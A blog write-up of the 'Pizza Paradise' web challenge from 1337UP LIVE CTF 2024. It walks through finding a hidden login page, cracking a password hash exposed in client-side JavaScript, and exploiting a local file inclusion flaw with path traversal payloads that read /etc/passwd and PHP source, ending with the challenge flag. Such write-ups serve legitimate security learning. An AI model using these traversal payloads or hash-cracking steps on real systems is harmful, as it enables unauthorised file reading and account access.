---
layout: post
title: Pizza Paradise - 1337UP LIVE CTF 2024
date: 2024-11-17 22:25:41
description: Writeup for a crypto CTF in 1337UP LIVE CTF 2024
tags: web
categories: ctf
---

# Pizza Paradise

**Author:** p4pa  
**Team:** xSTF  

## INFO
- **CTF:** 1337UP LIVE CTF 2024
- **Challenge:** Pizza Paradise
- **Category:** Web
- **Description:** Something weird going on at this pizza store!

## WriteUP

### Recon

We were provided a URL to a pizza store website. Initially, the site seemed entirely static, but I decided to explore further. This was my first web challenge in a CTF competition, so my methods are still evolving—take them with a grain of salt.

The first thing I did was open **ZAPROXY** and run an active scan, as I’ve been training with it and am quite liking the tool. **Burp Suite** is also a good option, but I stuck with ZAPROXY for this challenge.

The scan returned a few interesting results, including an unlinked page at:

```
https://pizzaparadise.ctf.intigriti.io/secret_172346606e1d24062e891d537e917a90.html
```

By checking the server response, I discovered it was a login page with the following JavaScript running:

```php
<script>
    function hashPassword(password) {
        return CryptoJS.SHA256(password).toString();
    }

    function validate() {
        const username = document.getElementById("username").value;
        const password = document.getElementById("password").value;

        const credentials = getCredentials();
        const passwordHash = hashPassword(password);

        if (
            username === credentials.username &&
            passwordHash === credentials.passwordHash
        ) {
            return true;
        } else {
            alert("Invalid credentials!");
            return false;
        }
    }
</script>
```

I tried logging in with some default credentials like `admin:admin`, but they didn't work. I then checked if the `getCredentials()` function was defined elsewhere on the site.

In the `/assets/js` directory, I found an `auth.js` file containing:

```js
const validUsername = "agent_1337";
const validPasswordHash = "91a915b6bdcfb47045859288a9e2bd651af246f07a083f11958550056bed8eac";

function getCredentials() {
    return {
        username: validUsername,
        passwordHash: validPasswordHash,
    };
}
```

With the password hash available, I attempted to crack it. I first tried **CrackStation** (https://crackstation.net/) and got the password `intel420`. While I could’ve used **hashcat** or **John the Ripper**, I opted for this faster method.

Using the credentials `agent_1337:intel420`, I successfully logged in and was redirected to:

```
https://pizzaparadise.ctf.intigriti.io/topsecret_a9aedc6c39f654e55275ad8e65e316b3.php
```

This page allowed me to download one of four photos.

### LFI

Upon inspecting the request, I saw that the photos were downloaded by sending a GET request with the `download` parameter:

```http
GET https://pizzaparadise.ctf.intigriti.io/topsecret_a9aedc6c39f654e55275ad8e65e316b3.php?download=%2Fassets%2Fimages%2Ftopsecret1.png HTTP/1.1
```

This raised a suspicion that the server could be vulnerable to **Local File Inclusion (LFI)**. I followed the methodology I learned from **HackTricks** and tried accessing the `/etc/passwd` file. To do this, I used the **Fuzzing tool** in **ZAPROXY** with this [LFI payload list](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) from **SecLists**. However, none of the payloads worked, returning a 200 status with the same content.

I took a step back and analyzed the photo download request. It was the only request that actually triggered a download, so I tested the LFI payloads there. I first tried manually adding `../../` to the URL **above `/assets/images/`**, as this was a condition for the LFI vulnerability:

```
https://pizzaparadise.ctf.intigriti.io/topsecret_a9aedc6c39f654e55275ad8e65e316b3.php?download=../../assets/images/
```

This returned an error:

```html
<br />
<b>Notice</b>:  readfile(): Read of 8192 bytes failed with errno=21 Is a directory in <b>/var/www/html/topsecret_a9aedc6c39f654e55275ad8e65e316b3.php</b> on line <b>13</b><br />
```

This indicated that the server was running on **Linux** and that the file was trying to read a directory. With this information, I proceeded with further fuzzing.

I appended `/assets/images/` to the LFI payloads and eventually found that the payload:

```
/assets/images/../../../../../../../../../../../../etc/passwd
```

successfully returned the contents of the `/etc/passwd` file. This confirmed that the server was vulnerable to LFI.

To confirm, I tried downloading the PHP file that was serving the page by using this payload:

```
/assets/images/../../../../../../../../../../../../var/www/html/topsecret_a9aedc6c39f654e55275ad8e65e316b3.php
```

This returned the source code of the PHP file, and within the code, I found the flag:

```php
$flag = 'INTIGRITI{70p_53cr37_m15510n_c0mpl373}';
```